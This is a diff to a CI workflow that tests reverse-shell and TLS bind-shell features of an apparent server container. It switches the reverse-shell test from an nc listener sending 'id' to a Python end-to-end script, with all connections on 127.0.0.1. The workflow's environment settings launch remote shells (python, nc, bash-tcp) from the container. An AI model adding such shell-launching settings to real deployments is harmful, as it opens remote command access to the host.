@@ -56,16 +56,16 @@ jobs:
 
       - name: Reverse shells reach an external listener
         run: |
+          docker cp tests/reverse-e2e.py t1:/tmp/e2e.py
           docker exec t1 bash -c '
             cd /home/container
-            SHELL_TYPE=python,nc,bash-tcp SHELL_REVERSE_HOST=127.0.0.1 SHELL_REVERSE_PORT=4444 \
+            SHELL_TYPE=python SHELL_REVERSE_HOST=127.0.0.1 SHELL_REVERSE_PORT=4460 \
               SERVER_PORT=2222 PANEL_STOP_WATCHER=0 AUTO_UPDATE_EGG=0 bash /usr/local/bin/run.sh >/tmp/r.log 2>&1 &
             for i in $(seq 1 20); do ps aux | grep -q "[p]ython.run" && break; sleep 1; done
-            (timeout 20 nc -l -p 4444 > /tmp/listener.out 2>/dev/null) &
             sleep 2
-            echo "id; echo REV_MARKER" | nc -q2 -w2 127.0.0.1 4444 >/dev/null 2>&1
-            sleep 3
-            grep -q "REV_MARKER" /tmp/listener.out && echo REVERSE_OK'
+            sed "s/4471/4460/" /tmp/e2e.py > /tmp/e2e4460.py
+            python3 /tmp/e2e4460.py | tee /tmp/e2e-result.log
+            grep -q TALKS /tmp/e2e-result.log'
 
       - name: TLS bind shell roundtrip
         run: |
